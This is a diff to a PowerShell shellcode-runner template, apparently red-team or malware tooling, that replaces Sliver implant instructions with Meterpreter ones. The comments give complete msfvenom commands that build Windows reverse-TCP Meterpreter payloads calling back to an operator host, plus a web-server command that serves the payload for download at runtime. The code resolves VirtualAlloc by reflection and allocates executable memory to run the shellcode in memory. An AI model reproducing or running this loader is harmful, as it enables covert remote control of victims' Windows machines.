@@ -1,12 +1,12 @@
 # =============================================================================
 # TEMPLATE — set $buf to your shellcode before running
 #
-# Full implant is multi-MB → download it at runtime (don't paste inline):
-#   sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
+# Full implant (stageless, ~200KB) → download it at runtime (don't paste inline):
+#   msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/sc.bin
 #   python3 -m http.server 80          # host /tmp/sc.bin
 #
-# Small shellcode (a stager) → paste the byte array inline instead:
-#   msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<IP> LPORT=<PORT> LURI=/hello.woff -f ps1
+# Small shellcode (a staged stager) → paste the byte array inline instead:
+#   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f ps1
 # =============================================================================
 
 function getDelegateType {
@@ -52,7 +52,7 @@ function LookupFunc {
 # OR small shellcode (stager): paste the bytes inline
 # [Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0
 
-# Allocate exactly the shellcode size (Sliver shellcode is MBs — a fixed 0x1000 would fail)
+# Allocate exactly the shellcode size (stageless Meterpreter is ~200KB — a fixed 0x1000 would fail)
 $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 'kernel32.dll' 'VirtualAlloc'), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
 $lpMem = $VirtualAlloc.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
 
